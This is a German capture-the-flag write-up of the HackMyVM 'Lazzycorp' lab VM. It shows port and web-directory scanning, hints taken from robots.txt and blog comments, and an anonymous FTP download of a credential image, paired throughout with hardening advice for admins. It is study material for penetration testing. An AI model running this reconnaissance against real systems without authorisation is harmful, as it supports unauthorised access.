<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lazzycorp - HackMyVM - Easy - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body class="level-easy">
 
    <div class="header-bg">
        <h1>Lazzycorp - HackMyVM - Easy - Bericht</h1>
        <div class="level-container">
            <h2>Easy</h2>
            <div class="circle">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <div class="tool-item">nmap</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">gobuster</div>
                <div class="tool-item">feroxbuster</div>
                <div class="tool-item">ftp</div>
                <div class="tool-item">stegseek</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">netcat (nc)</div>
                <div class="tool-item">ssh</div>
                <div class="tool-item">wget</div>
                <div class="tool-item">strings</div>
                <div class="tool-item">python3 http.server</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept">Proof of Concept</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <div class="code-block">
                <div class="terminal">
                    <pre>
ARP-Scan: 
192.168.2.175	08:00:27:d2:e7:e2	PCS Systemtechnik GmbH

:::::::::::::::::::::: Nmap nur offene Ports Ausgabe :::::::::::::::::::::::
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

<span class="command">21/tcp open  ftp     vsftpd 3.0.5</span>
<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span>
<span class="command">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Die Aufklärungsphase begann mit einem ARP-Scan, der die IP-Adresse `192.168.2.175` im lokalen Netzwerk identifizierte. Ein anschließender schneller Nmap-Scan enthüllte drei offene TCP-Ports: 21 (FTP), 22 (SSH) und 80 (HTTP). Die Versionserkennung liefert uns erste Anhaltspunkte zu den laufenden Diensten: `vsftpd 3.0.5`, `OpenSSH 8.2p1` und ein `Apache httpd 2.4.41` auf einem Ubuntu-System.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Diese drei Ports stellen die primären Angriffsvektoren dar. Jeder dieser Dienste hat Potenzial für Schwachstellen. FTP ist oft für anonymen Zugriff oder schwache Passwörter anfällig, SSH erfordert gültige Anmeldeinformationen und der Webserver auf Port 80 ist ein breites Feld für verschiedenste Web-Schwachstellen. Die Angriffsfläche ist klar definiert.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen detaillierteren Nmap-Scan mit Skripten (`-sC`) und erweiterter Versionserkennung (`-sV`) durch, um mehr über die Konfiguration der Dienste zu erfahren. Überprüfe den FTP-Server sofort auf anonymen Zugriff. Beginne parallel mit der Enumeration des Webservers.
<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle laufenden Dienste auf dem neuesten Stand sind. Deaktivieren Sie nicht benötigte Dienste. Der FTP-Dienst sollte, falls nicht zwingend erforderlich, deaktiviert oder zumindest sehr restriktiv konfiguriert werden (kein anonymer Zugriff, starke Passwörter, Benutzer-Jails).</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
::::::::::::::::::::::::::::: Nmap volle Ausgabe :::::::::::::::::::::::::::
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 16:26 EDT
Nmap scan report for Lazzycorp.hmv (192.168.2.175)
Host is up (0.00016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="command">21/tcp open  ftp     vsftpd 3.0.5</span>
| <span class="password">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
|_<span class="command">drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub</span>
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.2.197
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span>
| ssh-hostkey: 
|   3072 46:82:43:4b:ef:e0:b0:50:04:c0:d5:2c:3c:5c:7d:4a (RSA)
|   256 52:79:ea:92:35:b4:f2:5d:b9:14:f0:21:1c:eb:2f:66 (ECDSA)
|_  256 98:fa:95:86:04:75:31:39:c6:60:26:9e:26:86:82:88 (ED25519)
<span class="command">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
| <span class="command">http-robots.txt: 2 disallowed entries</span> 
|_<span class="command">/cms-admin.php /auth-LazyCorp-dev/</span>
|_http-title: LazyCorp | Empowering Devs
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:D2:E7:E2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.16 ms Lazzycorp.hmv (192.168.2.175)
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der detaillierte Nmap-Scan liefert zwei kritische Informationen. Erstens bestätigt das `ftp-anon`-Skript, dass ein anonymer FTP-Login erlaubt ist und findet im Stammverzeichnis ein Verzeichnis namens `pub`. Zweitens findet das `http-robots.txt`-Skript eine `robots.txt`-Datei auf dem Webserver, die zwei potenziell interessante Pfade verbirgt: `/cms-admin.php` und `/auth-LazyCorp-dev/`.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies sind massive Fortschritte. Der anonyme FTP-Zugriff ist eine direkte Tür ins System, um potenziell sensible Dateien zu finden. Die `robots.txt`-Einträge sind klassische "versteckte" Pfade, die oft zu Administrations- oder Entwickler-Panels führen und daher Hauptziele für die weitere Web-Enumeration sind.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Logge dich sofort per FTP anonym ein und untersuche den Inhalt des `pub`-Verzeichnisses gründlich. Parallel dazu, untersuche die in der `robots.txt` gefundenen Pfade mit Tools wie `gobuster` oder `feroxbuster`, um deren genauen Inhalt und Struktur zu ermitteln.
<br><strong>Empfehlung (Admin):</strong> Anonymer FTP-Zugriff sollte niemals aktiviert sein, es sei denn, der Server dient ausschließlich der Verteilung öffentlicher Dateien. Wenn er aktiviert ist, muss sichergestellt werden, dass in den freigegebenen Verzeichnissen keine sensiblen Informationen liegen. Einträge in `robots.txt` sollten nicht als Sicherheitsmaßnahme betrachtet werden; sie sind öffentlich einsehbar und dienen lediglich dazu, Suchmaschinen-Bots zu steuern.</p>
        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <div class="code-block">
                <div class="terminal">
                    <pre>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.2.175
+ Target Hostname:    192.168.2.175
+ Target Port:        80
+ Start Time:         2025-08-20 16:27:01 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ <span class="command">/robots.txt: contains 2 entries which should be manually viewed.</span> See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ /: Server may leak inodes via ETags, header found with file /, inode: 246, size: 639791cc4ffb8, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ <span class="password">Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54).</span> Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ 8104 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-08-20 16:27:36 (GMT-4) (35 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der Web-Scanner `Nikto` wurde auf den Webserver losgelassen. Er bestätigt den Fund der `robots.txt`-Datei und meldet mehrere Best-Practice-Verstöße wie fehlende Security-Header. Eine wichtige neue Information ist, dass die Apache-Version `2.4.41` als veraltet eingestuft wird. Dies könnte auf bekannte Schwachstellen (CVEs) für diese spezifische Version hindeuten.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Bestätigung der `robots.txt` verstärkt die Priorität dieser Pfade. Die Information über die veraltete Apache-Version ist wertvoll und sollte für eine gezielte Exploit-Suche im Hinterkopf behalten werden, auch wenn oft Konfigurationsfehler ein leichterer Einstieg sind als Exploits für den Webserver selbst.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe eine schnelle Suche nach bekannten Exploits für Apache 2.4.41 durch. Setze jedoch den Fokus weiterhin auf die Enumeration der in `robots.txt` gefundenen Pfade, da diese mit höherer Wahrscheinlichkeit zu einer anwendungsspezifischen Schwachstelle führen.
<br><strong>Empfehlung (Admin):</strong> Halten Sie die Webserver-Software und alle ihre Module stets auf dem neuesten Stand, um bekannte Schwachstellen zu mitigieren. Implementieren Sie die von `Nikto` empfohlenen Security-Header (`X-Frame-Options`, `X-Content-Type-Options`), um die allgemeine Sicherheit der Webanwendung zu erhöhen.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
::::::::::::::::::::::::: HTTP Records Permissions :::::::::::::::::::::::::
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

Allow: POST,OPTIONS,HEAD,GET

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
::::::::::::::::::::::::: HTTP-Header Verbose Scan :::::::::::::::::::::::::
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

*   Trying 192.168.2.175:80...
* Connected to 192.168.2.175 (192.168.2.175) port 80
* using HTTP/1.x
&gt; HEAD / HTTP/1.1
&gt; Host: 192.168.2.175
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
HTTP/1.1 200 OK
&lt; Date: Wed, 20 Aug 2025 20:27:01 GMT
Date: Wed, 20 Aug 2025 20:27:01 GMT
&lt; <span class="command">Server: Apache/2.4.41 (Ubuntu)</span>
Server: Apache/2.4.41 (Ubuntu)
&lt; Last-Modified: Wed, 09 Jul 2025 06:23:16 GMT
Last-Modified: Wed, 09 Jul 2025 06:23:16 GMT
&lt; ETag: "246-639791cc4ffb8"
ETag: "246-639791cc4ffb8"
&lt; Accept-Ranges: bytes
Accept-Ranges: bytes
&lt; Content-Length: 582
Content-Length: 582
&lt; Vary: Accept-Encoding
Vary: Accept-Encoding
&lt; Content-Type: text/html
Content-Type: text/html
&lt; 

* Connection #0 to host 192.168.2.175 left intact
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ein `curl`-Befehl mit einer `HEAD`-Anfrage wurde verwendet, um die HTTP-Header des Servers abzurufen. Dies bestätigt erneut die Server-Version `Apache/2.4.41 (Ubuntu)` und die erlaubten HTTP-Methoden. Es liefert keine neuen kritischen Informationen, dient aber der sauberen Dokumentation und Verifizierung.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist ein Standardverfahren zur Informationssammlung und bestätigt die bisherigen Erkenntnisse, ohne neue Angriffsvektoren aufzudecken.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gehe zur aktiven Enumeration mit Content-Discovery-Tools über.
<br><strong>Empfehlung (Admin):</strong> Um die Informationsgewinnung für Angreifer zu erschweren, kann die `Server`-Signatur in der Apache-Konfiguration mit `ServerTokens Prod` minimiert werden.</p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">gobuster dir -u http://192.168.2.175/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,log,gz</span></div>
                    <pre>
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.175/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ...
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
<span class="command">/index.html           (Status: 200) [Size: 582]</span>
<span class="command">/blog                 (Status: 301) [Size: 313] [--> http://192.168.2.175/blog/]</span>
<span class="command">/uploads              (Status: 301) [Size: 316] [--> http://192.168.2.175/uploads/]</span>
<span class="command">/robots.txt           (Status: 200) [Size: 55]</span>
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Das Tool `gobuster` wurde für eine umfassende Verzeichnis-Enumeration gegen die Web-Wurzel eingesetzt. Es wurden die Verzeichnisse `/blog` und `/uploads` gefunden, die beide mit einem HTTP-Status 301 (permanente Weiterleitung) antworten, was auf existierende Verzeichnisse hindeutet. Der Scan bestätigt auch die Existenz von `index.html` und `robots.txt`.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Entdeckung von `/blog` und `/uploads` ist signifikant. Ein Blog kann sensible Informationen, Benutzernamen oder Hinweise auf verwendete Technologien enthalten. Ein `/uploads`-Verzeichnis ist immer ein hochinteressantes Ziel, da es auf eine Dateiupload-Funktionalität hindeutet, die ein primärer Vektor für Remote Code Execution sein kann.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt des `/blog`-Verzeichnisses manuell und mit weiteren Enumeration-Tools. Führe auch gegen `/uploads` eine Enumeration durch, um zu sehen, ob Dateien direkt aufgelistet oder erraten werden können.
<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie die Verzeichnisauflistung (Directory Listing) für alle Verzeichnisse auf dem Webserver. Der Zugriff auf `/uploads`-Verzeichnisse sollte, falls möglich, eingeschränkt werden. Dateien sollten mit zufälligen Namen gespeichert werden, um ein Erraten zu verhindern.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
http://192.168.2.175/robots.txt
<span class="command">Disallow: /cms-admin.php</span>
<span class="command">Disallow: /auth-LazyCorp-dev/</span>
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `robots.txt`-Datei wird hier explizit angezeigt. Sie weist Suchmaschinen an, die beiden Pfade `/cms-admin.php` und `/auth-LazyCorp-dev/` nicht zu indizieren.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Für einen Pentester ist dies eine direkte Einladung, genau diese Pfade zu untersuchen. Solche `Disallow`-Einträge deuten fast immer auf administrative Bereiche, Login-Seiten oder andere sensible Ressourcen hin, die die Betreiber vor der Öffentlichkeit verbergen möchten.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, beide Pfade direkt im Browser aufzurufen. Führe anschließend eine gezielte Verzeichnis-Enumeration gegen `/auth-LazyCorp-dev/` durch, da es sich um ein Verzeichnis handelt.
<br><strong>Empfehlung (Admin):</strong> Verlassen Sie sich niemals auf `robots.txt` als Sicherheitsmechanismus. Sensible Pfade sollten durch echte Authentifizierungs- und Autorisierungsmechanismen geschützt werden. Die Verwendung von `robots.txt` macht Angreifer nur auf die Existenz dieser Pfade aufmerksam.</p>
        </section>
		
		
		<!-- Teil 2 -->
		
		<section id="web-enumeration" style="padding-top: 40px;">
             <h2 style="margin-top:0;">Web Enumeration Fortsetzung...</h2>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">feroxbuster --url "http://192.168.2.175/" --wordlist "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv</span></div>
                    <pre>
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.2.175/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
...
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c http://192.168.2.175/auth-LazyCorp-dev
404      GET        9l       31w      275c http://192.168.2.175/cms-admin.php
...
<span class="command">200      GET       22l      100w      744c http://192.168.2.175/blog/blog.php</span>
<span class="command">200      GET       17l       47w      582c http://192.168.2.175/index.html</span>
<span class="command">301      GET        9l       28w      313c http://192.168.2.175/blog => http://192.168.2.175/blog/</span>
<span class="command">301      GET        9l       28w      316c http://192.168.2.175/uploads => http://192.168.2.175/uploads/</span>
<span class="command">200      GET       17l       47w      582c http://192.168.2.175/</span>
<span class="command">200      GET        2l        4w       55c http://192.168.2.175/robots.txt</span>
<span class="command">200      GET       26l      136w     1060c http://192.168.2.175/blog/blog1.php</span>
<span class="command">200      GET       23l      110w      876c http://192.168.2.175/blog/blog2.php</span>
<span class="command">200      GET        3l       15w      123c http://192.168.2.175/blog/blog3.php</span>
<span class="command">200      GET        1l        2w       23c http://192.168.2.175/dev_admin_portal/login.php</span>
...
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_2_175_-1755723059.state ...
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ein weiterer Scan mit `feroxbuster`, der rekursiv arbeitet, liefert deutlich mehr Details, insbesondere innerhalb des `/blog`-Verzeichnisses. Es werden mehrere Blog-Eintrags-Dateien gefunden: `blog.php`, `blog1.php`, `blog2.php` und `blog3.php`. Zusätzlich wird ein neues Verzeichnis `/dev_admin_portal` mit einer `login.php`-Seite entdeckt. Interessanterweise liefern die Pfade aus der `robots.txt` hier einen 404-Fehler, was auf eine falsche Schreibweise oder eine veraltete Konfiguration hindeuten könnte.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein enormer Fortschritt. Die Blog-Einträge sind eine wahrscheinliche Quelle für Hinweise, Benutzernamen oder Kontextinformationen. Das neu entdeckte Login-Portal `/dev_admin_portal/login.php` ist ein hochpriorisiertes Ziel. Die Tatsache, dass die Pfade aus der `robots.txt` nicht direkt funktionieren, erfordert weiteres Nachforschen (z.B. Testen verschiedener Schreibweisen).</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere den Inhalt jeder einzelnen Blog-Datei sorgfältig auf versteckte Hinweise oder Kommentare im Quelltext. Untersuche die neu gefundene `login.php`-Seite auf Schwachstellen. Teste Variationen der Pfade aus der `robots.txt` (z.B. alles in Kleinbuchstaben).
<br><strong>Empfehlung (Admin):</strong> Alte oder ungenutzte Login-Portale sollten vollständig vom Server entfernt werden. Verzeichnisse und Dateien sollten einer konsistenten Namenskonvention folgen, um Verwirrung und Fehler zu vermeiden. Blog-Einträge oder öffentliche Inhalte dürfen niemals sensible interne Informationen oder Hinweise auf die Systemkonfiguration enthalten.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
http://192.168.2.175/blog/blog.php

DevLog #1: Credential Chaos
... he shared it in an image file. Classic Dev.
&lt;-- Arvind: He used note.jpg again. Let's see how long it lasts this time. --&gt;
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der erste Blogeintrag enthält einen kritischen Hinweis in Form eines HTML-Kommentars. Der Kommentar von "Arvind" erwähnt explizit, dass ein Entwickler ("Dev") seine Zugangsdaten in einer Bilddatei namens `note.jpg` geteilt hat.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein direkter und unmissverständlicher Hinweis. Er verbindet die Information über "vergessene Zugangsdaten" mit einem konkreten Dateinamen. Da wir auf dem anonymen FTP-Server bereits das Verzeichnis `/pub` gefunden haben, ist es äußerst wahrscheinlich, dass diese `note.jpg`-Datei dort zu finden ist.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greife sofort auf den FTP-Server zu, navigiere in das `pub`-Verzeichnis und lade die `note.jpg`-Datei herunter. Analysiere das Bild anschließend auf sichtbare Informationen und versteckte Daten (Steganographie).
<br><strong>Empfehlung (Admin):</strong> Entwickler und Mitarbeiter müssen strengstens angewiesen werden, niemals Zugangsdaten oder andere sensible Informationen in ungesicherten Formaten oder über unsichere Kanäle zu teilen. Die Verwendung von Kommentaren im öffentlichen Quelltext zur Kommunikation über interne Vorgänge ist inakzeptabel.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
http://192.168.2.175/blog/blog1.php

DevLog #2: Transfer Woes and Lost Data
... "Always keep the data intact by using the proper means."
&lt;-- Hidden Hint: Sometimes the simplest transfer method—one that preserves every byte—protects the hidden secrets best. --&gt;
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der zweite Blogeintrag liefert einen weiteren, subtileren Hinweis. Es wird über Datenverlust bei Dateiübertragungen gesprochen und ein versteckter Hinweis im Kommentar betont, wie wichtig es ist, eine Methode zu verwenden, die "jedes Byte bewahrt", um "versteckte Geheimnisse" zu schützen.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein starker Hinweis auf Steganographie. Der Hinweis deutet darauf hin, dass die `note.jpg`-Datei nicht nur sichtbare Informationen enthält, sondern dass zusätzliche Daten in den Bytes des Bildes selbst versteckt sind. Der Standard-FTP-Übertragungsmodus (ASCII) kann Bilddaten beschädigen. Man muss in den `BINARY`-Modus wechseln, um die Datei intakt herunterzuladen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle beim Herunterladen der `note.jpg`-Datei per FTP sicher, dass der `BINARY`-Übertragungsmodus aktiviert ist (`bin`-Befehl im FTP-Client). Dies stellt sicher, dass die Datei exakt Byte für Byte kopiert wird und eventuell versteckte Daten erhalten bleiben.
<br><strong>Empfehlung (Admin):</strong> Erneut: Sensible Informationen oder Hinweise auf Sicherheitspraktiken haben in öffentlichen Blogeinträgen nichts zu suchen.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
http://192.168.2.175/blog/blog2.php

DevLog #3: Reset Ritual
... a script that resets everything back to default. ...
The script lives somewhere under /usr/local/bin/ if anyone needs it.
&lt;-- Arvind: Reset script was never meant to be writeable by anyone... yet here we are. --&gt;
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der dritte Blogeintrag spricht von einem Reset-Skript, das sich unter `/usr/local/bin/` befindet. Der Kommentar von Arvind deutet an, dass dieses Skript möglicherweise unsichere Berechtigungen hat ("never meant to be writeable by anyone...").</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein extrem wertvoller Hinweis für die Privilege-Escalation-Phase. Ein Skript in `/usr/local/bin/`, das möglicherweise von einem niedrig privilegierten Benutzer beschrieben werden kann und eventuell von einem Cron-Job oder einem anderen privilegierten Prozess ausgeführt wird, ist ein klassischer Vektor zur Rechteausweitung.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere dir diesen Hinweis für die Post-Exploitation-Phase. Sobald ein Shell-Zugang erlangt wurde, muss das Verzeichnis `/usr/local/bin/` sofort auf dieses Skript und dessen Berechtigungen überprüft werden.
<br><strong>Empfehlung (Admin):</strong> Skripte in Systemverzeichnissen wie `/usr/local/bin/` müssen restriktive Berechtigungen haben. Sie sollten nur dem `root`-Benutzer gehören und nur von diesem beschreibbar sein. Regelmäßige Überprüfungen der Dateiberechtigungen sind unerlässlich.</p>
            <div class="code-block">
                <div class="terminal">
                    <pre>
http://192.168.2.175/blog/blog3.php
internal dev panel?
&lt;a href="../dev_admin_portal/login.php"&gt;internal dev panel?&lt;/a&gt;
 
&lt;-- Arvind: bro you forgot to disable that old login --&gt; 
</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der vierte Blogeintrag enthält einen direkten Link zum `/dev_admin_portal/login.php`, den `feroxbuster` bereits gefunden hatte. Der Kommentar bestätigt, dass es sich um ein "altes" Login-Panel handelt, das eigentlich deaktiviert sein sollte.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die Relevanz des Login-Portals. Veraltete, vergessene Systeme sind oft anfällig, da sie nicht mehr gewartet werden und bekannte Schwachstellen aufweisen können.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Fokus liegt nun klar auf dem FTP-Server (um `note.jpg` zu bekommen) und den beiden Login-Portalen (`/dev_admin_portal/login.php` und das aus der `robots.txt` stammende `/auth-lazycorp-dev/`).
<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie ungenutzte Anwendungen nicht nur durch das Entfernen von Links, sondern deinstallieren Sie sie vollständig vom Server, um zu verhindern, dass sie als vergessene Angriffsvektoren dienen.</p>
        </section>

        <section id="initial-access">
            <h2>Initial Access</h2>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿kali)-[~]
└─# <span class="command">ftp 192.168.2.175</span></div>
                    <pre>
Connected to 192.168.2.175.
220 (vsFTPd 3.0.5)
Name (192.168.2.175:AlienTec): Anonymous
331 Please specify the password.
Password: 
<span class="password">230 Login successful.</span>
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||33669|)
150 Here comes the directory listing.
dr-xr-xr-x    3 114      119          4096 Jul 05 14:50 .
dr-xr-xr-x    3 114      119          4096 Jul 05 14:50 ..
<span class="command">drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub</span>
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||55507|)
150 Here comes the directory listing.
drwxr-xr-x    2 114      119          4096 Jul 16 12:35 .
dr-xr-xr-x    3 114      119          4096 Jul 05 14:50 ..
<span class="command">-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg</span>
226 Directory send OK.
ftp> get note.jpg
local: note.jpg remote: note.jpg
229 Entering Extended Passive Mode (|||60445|)
150 Opening BINARY mode data connection for note.jpg (1366786 bytes).
100% |*************************************************|  1334 KiB  150.77 MiB/s    00:00 ETA
<span class="password">226 Transfer complete.</span>
1366786 bytes received in 00:00 (148.18 MiB/s)
ftp> 
</pre>
                </div>
            </div>
